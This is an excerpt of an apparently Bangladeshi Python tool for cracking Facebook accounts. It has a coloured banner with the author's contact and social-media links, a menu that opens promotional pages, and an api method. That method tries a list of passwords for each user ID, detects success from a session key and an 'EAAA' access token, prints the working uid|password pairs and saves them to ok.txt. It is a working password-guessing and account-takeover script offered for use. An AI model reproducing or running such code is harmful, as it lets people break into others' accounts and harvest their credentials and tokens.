...
\033[1;32m║═══════════════════════════════════════════════════════════║ \x1b[1;91m  
\033[1;32m║WHATSAPP : +8801644777805\x1b[1;91m     
\033[1;32m║═══════════════════════════════════════════════════════════║ \x1b[1;91m        
\033[1;32m║GITHUB         : Brother-Tech\x1b[1;91m    
\033[1;32m║═══════════════════════════════════════════════════════════║
\033[1;32m║SERVER      : DATA - WIFI WORKING\033[37;41mPROJECT 2009\033[0;m\033[1;32m      
\033[1;32m║═══════════════════════════════════════════════════════════║
\033[1;32m║FACEBOOK LINK : \x1b[1;91mhttps://www.facebook.com/mumitislam.himu\033[1;32m  
\033[1;32m║═══════════════════════════════════════════════════════════║
\033[1;32m║YouTube LINK  : \x1b[1;91mhttps://youtube.com/@brothertech\033[1;32m    
\033[1;32m╚═══════════════════════════════════════════════════════════╝\033[1;37m""")
class Main:
	def __init__(self):
		self.id = []
		...
		print("╚══════════════════════════════════════════════════════════╝")
		print("\033[1;32m [1] FIRST SUBSCRIBE FOR APPROVE")
		...
		if Talha in ["1", "01"]:
			self.fbtua()
		if Talha in ["2", "02"]:
			os.system('xdg-open https://www.facebook.com/mumitislam.himu?mibextid=ZbWKwL')
		if Talha in ["3", "03"]:
			os.system('xdg-open https://youtube.com/@brothertech')
		if Talha in ["4", "04"]:
			os.system('xdg-open https://www.facebook.com/FollowerSallerBD/')
		if Talha in ["0", "00"]:
			self.old2()
			exit()
		else:
	...
	def fbtua(self):
		...
		try:
			...
			os.system('xdg-open https://github.com/Brother-Tech')
			os.system('clear')
			print(logo) 
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[91;1m   [Himu_CP] %s | %s\033[94;1m        "%(uid, pw)) 
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
